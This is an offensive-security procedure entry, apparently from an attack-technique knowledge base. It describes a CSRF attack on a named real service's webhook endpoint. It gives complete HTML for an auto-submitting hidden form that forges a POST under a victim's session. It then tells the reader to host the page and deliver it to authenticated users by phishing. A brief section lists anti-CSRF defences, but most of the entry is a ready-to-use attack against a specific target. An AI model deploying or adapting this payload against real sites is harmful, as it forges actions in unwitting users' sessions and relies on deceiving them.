---
id: proc-uuid-2
name: Craft-Malicious-CSRF-Form-for-Webhook-Submission
tags:
  - csrf
  - exploit
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:03.126Z'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-CSRF-Form-for-Webhook-Submission

## Summary

This procedure creates a malicious HTML page with an auto-submitting form to exploit a CSRF vulnerability, forging data submission to the Legal Robot webhook endpoint and tricking authenticated users into unintended actions.

## Description

CSRF attacks leverage a victim's authenticated session to perform actions on a target site via cross-origin requests. For Legal Robot's /webhooks/beta endpoint, which lacks protections, this involves crafting a hidden form that mimics legitimate submissions with attacker-controlled data (e.g., fake names and emails). The form auto-submits on load, potentially creating unauthorized webhook entries. This is low-impact due to the endpoint's public accessibility but demonstrates session hijacking risks. Prerequisites: Knowledge of the target endpoint and ability to host/deliver the malicious page (e.g., via phishing).

## Requirements

1. Text editor to create HTML file
2. Web server to host the malicious page
3. Victim with active session on target site

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens for all POST endpoints
- Validate Referer and Origin headers strictly
- Log and alert on submissions from unexpected origins

## Objectives

1. Forge and submit user data cross-site
2. Demonstrate impact on authenticated sessions
3. Highlight need for anti-CSRF controls

## Instructions

### Step 1: Create the Malicious HTML Form

**Context**: Build a form that replicates the target endpoint's structure.

Create an HTML file (csrf.html) with:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf-form" action="https://app.legalrobot.com/webhooks/beta" method="POST">
    <input type="hidden" name="firstName" value="Attacker">
    <input type="hidden" name="lastName" value="Victim">
    <input type="hidden" name="position" value="Hacker">
    <input type="hidden" name="company" value="Evil Corp">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="language" value="nl">
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

### Step 2: Host and Deliver the Page

**Context**: Make the page accessible to the victim.

Host csrf.html on a server (e.g., local Python server: python -m http.server 8000). Send the URL to the victim via email or link, ensuring they are authenticated to Legal Robot.

### Step 3: Verify Exploitation

**Context**: Confirm the forged submission.

Monitor network traffic or server logs on the attacker's side. Check Legal Robot for new webhook entries with forged data.

**Expected Output**: Successful POST request without errors, data submitted under victim's session.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web]]
- [[exploit]]
